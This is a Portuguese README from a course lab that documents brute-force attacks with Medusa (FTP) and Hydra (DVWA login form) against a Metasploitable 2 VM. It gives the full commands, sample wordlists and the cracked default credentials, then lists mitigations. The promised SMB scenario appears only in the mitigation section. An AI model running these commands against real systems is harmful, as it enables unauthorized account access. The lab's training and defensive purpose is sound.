# Projeto de Força Bruta com Kali Linux usando Medusa

Este projeto visa simular e documentar um ataque de força bruta contra diferentes serviços (FTP, Web, SMB) utilizando Kali Linux e a ferramenta Medusa (e Hydra para Web), exercitando o reconhecimento das vulnerabilidades e a proposição de medidas de mitigação, conforme o desafio da DIO.

# 1. Configuração do Ambiente de Laboratório 🖥️

O ambiente foi configurado para isolamento, garantindo que os ataques não afetem redes externas.

# 1.1. Topologia de Rede (VirtualBox)
Tipo de Rede: Host-only Adapter (ou Rede Interna).

Sub-Rede Utilizada: 255.255.255.0

# 1.2. Hosts e Endereços IP 

| Máquina | Função | IP de Exemplo |
| :--- | :--- | :--- |
| Kali Linux | Atacante | `192.168.01.105` |
| Metasploitable 2/DVWA | Alvo | `192.168.01.101` |




## 2. Ferramentas Utilizadas 🛠️

* **VirtualBox:** Para virtualização e criação da rede isolada.
* **Kali Linux (Atacante):** Sistema operacional com as ferramentas de auditoria.
* **Metasploitable 2 (Alvo):** Servidor vulnerável por design, hospedando serviços como FTP, SMB e o DVWA.
* **Medusa:** Ferramenta principal para ataques de força bruta paralelos em serviços de rede.
* **Hydra:** Ferramenta alternativa utilizada para o ataque ao formulário web (DVWA), por sua flexibilidade com parâmetros HTTP.
* **Wordlists:** Listas de palavras (usuários e senhas) criadas para os testes.

---

## 3. Execução dos Cenários de Ataque ⚔️

Para simular os cenários, foram criadas duas *wordlists* muito simples. Em um cenário real, elas seriam imensamente maiores (ex: `rockyou.txt`).

**`usuarios.txt`**

root 

admin

msfadmin

user

**`senhas.txt`**

admin 

1234

password

msfadmin

### 3.1. Cenário 1: Brute Force em FTP (Porta 21)

O serviço FTP (File Transfer Protocol) no Metasploitable 2 é conhecido por ter credenciais fracas.

**Objetivo:** Obter acesso FTP.

**Ferramenta:** Medusa

**Comando:**
```bash
# -h: Host (Alvo)
# -U: Arquivo de Usuários
# -P: Arquivo de Senhas
# -M: Módulo (ftp)

medusa -h 192.168.01.101 -U usuarios.txt -P senhas.txt -M ftp
```
Resultados: O Medusa testa rapidamente todas as combinações e identifica as credenciais válidas.

[SUCCESS] Host: 192.168.01.101 (ftp) User: msfadmin Pass: msfadmin


Acesso Validado: msfadmin / msfadmin


## 3.2. Cenário 2: Brute Force em Formulário Web (DVWA)
O DVWA (Damn Vulnerable Web Application) possui um formulário de login que, no nível "Low", não possui proteções contra força bruta.

**Objetivo:** Obter acesso administrativo ao painel do DVWA.

**Ferramenta:** Hydra (preferida para formulários web).

Comando:
```bash
 -L: Lista de Usuários
 -P: Lista de Senhas
 http-post-form: Módulo do Hydra
 "/dvwa/login.php:username=^USER^&...:Login=Login": Payload do POST
 "Login failed": String que indica falha

hydra -L usuarios.txt -P senhas.txt 192.168.01.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```
**Resultados:**
[SUCCESS] Host: 192.168.01.101 Login: admin Password: password


## 4. Recomendações de Mitigação e Defesa 🛡️
A execução desses ataques expõe vulnerabilidades críticas. A seguir, detalhamos as contramedidas específicas para cada cenário, baseadas no princípio de "Defesa em Profundidade".

## 4.1. Mitigação para Brute Force em FTP (Cenário 1)

* **Substituição de Protocolo:** Desabilitar o FTP (inseguro, envia senhas em texto plano) e substituí-lo por SFTP (SSH File Transfer Protocol) ou FTPS (FTP over SSL), que criptografam a autenticação.

* **Monitoramento Ativo (Fail2Ban):** Implementar ferramentas como o Fail2Ban, que monitoram logs e banem automaticamente IPs que apresentarem múltiplas tentativas de login falhas.

* **Restrição por Firewall:** Limitar o acesso à porta do serviço (seja FTP ou SFTP) apenas a IPs confiáveis. Se o serviço não precisa estar aberto para o mundo, não deve estar.

* **Política de Contas:** Aplicar bloqueio de contas (account lockout) após N tentativas falhas e exigir senhas fortes.

## 4.2. Mitigação para Brute Force em Web (Cenário 2)

* **Implementação de CAPTCHA:** Adicionar um desafio após 2-3 tentativas de login falhas. Isso quebra a automação de scripts como Hydra.

* **Rate Limiting):** Configurar o servidor web  para limitar o número de tentativas de login por IP em um curto período (ex: 10 tentativas por minuto).

* **Bloqueio de Contas na Aplicação:** A própria aplicação deve bloquear temporariamente a conta do usuário (ex: admin) após 5 falhas, independentemente do IP de origem.

* **Tokens Anti-CSRF:** Usar tokens únicos e secretos em cada formulário para garantir que a requisição está vindo da página web legítima, e não de um script externo.

## 4.3. Mitigação para Password Spraying em SMB (Cenário 3)

* **Política de Senhas Fortes (Proibidas):** Esta é a defesa principal. Implementar políticas (via GPO no Active Directory, por exemplo) que proíbam senhas comuns, previsíveis ou fracas (ex: Verao@2025, Empresa123, msfadmin).

* **Não Exposição do SMB:** O serviço SMB (porta 445) jamais deve ser exposto à internet.

* **Segmentação de Rede Interna:** Dentro da rede, firewalls devem restringir a comunicação SMB apenas entre máquinas que precisam dela (ex: estações de trabalho e servidores de arquivos), e não entre todos os segmentos.

**Monitoramento e Detecção (SIEM):** Usar um SIEM para detectar o padrão de spraying (muitos usuários, uma senha falha, vindos de um IP). Isso é um alerta de alta prioridade.

* **utenticação Multifator (MFA):** Habilitar MFA em todas as contas, especialmente as administrativas. Mesmo que o atacante acerte a senha, ele não terá o segundo fator.


